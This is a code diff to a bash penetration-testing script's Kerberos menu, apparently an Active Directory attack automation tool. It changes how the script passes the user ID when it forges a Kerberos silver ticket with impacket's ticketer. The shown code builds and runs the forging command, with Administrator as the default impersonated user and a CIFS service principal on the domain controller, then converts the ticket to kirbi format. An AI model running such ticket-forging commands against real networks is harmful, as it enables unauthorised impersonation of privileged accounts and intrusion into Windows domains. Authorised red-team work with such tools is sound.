@@ -3804,7 +3804,7 @@ kerberos_menu () {
         else
             if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                 tick_randuser="Administrator"
-                tick_randuserid="500"
+                tick_randuserid=""
                 tick_spn="CIFS/${dc_domain}"
                 tick_groups=""
                 tick_servuser=""
@@ -3840,9 +3840,9 @@ kerberos_menu () {
                     echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
                     read -p ">> " tick_randuser_value </dev/tty
                     if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "Please specify the chosen user's ID (press Enter to choose default value '500'):"
+                    echo -e "Please specify the chosen user's ID (press Enter to choose default value EMPTY):"
                     read -p ">> " tick_randuserid_value </dev/tty
-                    if [[ ! ${tick_randuserid_value} == "" ]]; then tick_randuserid="${tick_randuserid_value}"; fi
+                    if [[ ! ${tick_randuserid_value} == "" ]]; then tick_randuserid="-user-id ${tick_randuserid_value}"; fi
                     echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
                     read -p ">> " tick_spn_value </dev/tty
                     if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
@@ -3853,7 +3853,7 @@ kerberos_menu () {
                     echo -e "${CYAN}[*] Generating silver ticket for service $spn...${NC}"
                     current_dir=$(pwd)
                     cd ${output_dir}/Credentials
-                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} -user-id ${tick_randuserid} ${tick_randuser}"
+                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}"
                     ticket_ccache_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').ccache"
                     ticket_kirbi_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').kirbi"
                     run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
